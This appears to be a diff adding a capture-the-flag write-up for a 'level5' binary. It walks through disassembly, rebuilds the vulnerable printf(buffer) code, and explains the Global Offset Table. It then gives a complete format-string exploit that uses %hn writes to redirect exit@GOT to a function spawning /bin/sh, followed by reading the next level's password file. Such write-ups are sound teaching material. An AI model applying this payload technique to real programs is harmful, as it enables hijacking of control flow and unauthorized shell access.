@@ -1,0 +1,208 @@
+
+## 1. Inspecting the program
+after see and test the program we disas the main to see if there's any possibility to reach the bin/sh to get the .pass and here we see there is no calling of function system look at the source code and also there is no posibility to do buffer overflow to overwrite the ret address cause the fgets read in the program just 512 and the buffer can hold 520.
+
+To see the available functions inside the binary with GDB:
+
+```gdb
+info functions
+```
+
+This revealed an interesting function named `o`.
+
+To inspect its assembly:
+
+```gdb
+disas o
+```
+
+The disassembly was:
+
+```asm
+0x080484a4 <+0>:  push   %ebp
+0x080484a5 <+1>:  mov    %esp,%ebp
+0x080484a7 <+3>:  sub    $0x18,%esp
+0x080484aa <+6>:  movl   $0x80485f0,(%esp)
+0x080484b1 <+13>: call   system@plt
+0x080484b6 <+18>: movl   $0x1,(%esp)
+0x080484bd <+25>: call   _exit@plt
+```
+
+## 2. Identifying the command executed by `system`
+
+The first argument passed to `system()` is the pointer `0x080485f0`.
+
+To inspect the string stored at that address:
+
+```gdb
+x/s 0x080485f0
+```
+
+The result was:
+
+```text
+"/bin/sh"
+```
+
+This confirms that the function executes:
+
+```c
+system("/bin/sh");
+```
+
+before terminating the process with `_exit(1)`.
+
+## 3. Reconstructed C source for `o`
+
+A close approximation of the function is:
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+
+void o(void)
+{
+    system("/bin/sh");
+    _exit(1);
+}
+```
+
+## 4. Reconstructing the `n` function
+
+Disassembling `n` showed that it:
+
+1. Allocates a local stack buffer.
+2. Reads user input with `fgets`.
+3. Passes the user-controlled buffer directly to `printf`.
+4. Exits the program.
+
+so there is a problem the function n exit before program reach the return address that why the stack overflow is NOT possible here
+Equivalent C code:
+
+```c
+void n(void)
+{
+    char buffer[0x208];
+
+    fgets(buffer, 0x200, stdin);
+    printf(buffer);
+    exit(1);
+}
+```
+
+The `main` function simply calls `n`:
+
+```c
+int main(void)
+{
+    n();
+    return 0;
+}
+```
+
+Because `n()` calls `exit(1)`, the `return` statement is never reached.
+
+## 5. Overall control flow
+
+```text
+main()
+    |
+    v
+n()
+    |
+    +--> fgets(buffer, 512, stdin)
+    |
+    +--> printf(buffer)
+    |
+    +--> exit(1)
+
+o()
+    |
+    +--> system("/bin/sh")
+    |
+    +--> _exit(1)
+```
+
+
+## 6 GOT entries (Global Offset Table)
+
+after searching about the printf and how it can help us, we found something named GOT entries (Global Offset Table).
+
+A GOT entry is a memory slot used by a program to store the real address of external functions (and some globals) at runtime.
+
+so the exection flow becomes like that 
+
+```bash
+call printf@PLT → jump to GOT entry → real printf()
+```
+
+## 7 . Exploitation strategy
+
+the printf function is called in the function n and the input is passed directly to it, so we can use the format string vulnerability to overwrite the GOT entry of printf with the address of o function.
+
+how we can do that is by using the `%n` format specifier to write the number of bytes printed so far to a specific memory address, but there is a problem the address of o() is to large to be written in one go, so we need to split it into two parts and write them separately.
+
+```bash
+0x080484a4 = 134,513,828 (decimal)
+```
+
+Solution: Split the write (%hn technique)
+
+To solve this, we split the address into two 16-bit parts:
+```bash
+Upper half: 0x0804
+Lower half: 0x84a4
+```
+
+We use %hn which writes 2 bytes at a time.
+
+Target locations (GOT entries)
+
+We target the memory location of:
+```bash 
+exit@GOT = 0x08049838
+```
+
+We place two addresses in input:
+
+0x08049838
+0x0804983a
+
+Each will receive half of the address of o().
+
+
+to fetch the address of exit() in the global offset table we do
+
+```bash
+objdump -R ./level5 | grep exit ==> 0x08049838
+```
+
+the final to overwrite the exit@GOT with the address of o() is:
+
+```bash
+(python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044c" + "%4$hn" + "%31904c" + "%5$hn"'; cat) | ./level5
+```
+after it complete you will do :
+
+```bash 
+cat /home/user/level6/.pass
+```
+and you will find the pass .
+
+Addresses and format-string writes
+
+- `\x3a\x98\x04\x08` (Address 1): the little-endian bytes for `0x0804983a` — the upper 2 bytes of the `exit` GOT entry. Placed first in the payload, this lands at stack offset 4.
+
+- `\x38\x98\x04\x08` (Address 2): the little-endian bytes for `0x08049838` — the lower 2 bytes of the `exit` GOT entry. Placed second, this lands at stack offset 5.
+
+Write steps (using `%hn` to write 2 bytes at a time):
+
+1. `%2044c` — pad the output so the printf character counter reaches 2052 bytes (0x0804). Note: the two address bytes at the start already consume 8 printed bytes, so the padding value is chosen accordingly.
+
+2. `%4$hn` — write the current count (2052) to the address at stack offset 4 (Address 1). This overwrites the upper half of the `exit` GOT entry with `0x0804`.
+
+3. `%31904c` — continue padding so the total printed count reaches 33956 bytes (0x84a4).
+
+4. `%5$hn` — write the new total (33956) to the address at stack offset 5 (Address 2). This overwrites the lower half of the `exit` GOT entry with `0x84a4`.
+
+After these writes the two 16-bit halves combine into the 32-bit address `0x080484a4` (the address of `o()`), so subsequent calls through the `exit` GOT will jump to `o()`.
